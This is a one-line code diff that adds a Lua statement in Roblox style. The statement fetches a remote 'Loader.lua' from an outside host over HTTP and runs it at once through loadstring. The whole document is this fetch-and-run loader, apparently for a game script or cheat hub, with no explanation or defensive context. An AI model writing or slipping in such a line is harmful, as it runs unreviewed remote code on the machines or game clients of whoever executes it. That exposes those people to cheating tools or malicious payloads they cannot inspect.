@@ -1,0 +1,1 @@
+loadstring(game:HttpGetAsync("https://api.trxdent.com.tr/xarmor/ID-1-TRXDENT/Loader.lua"))()
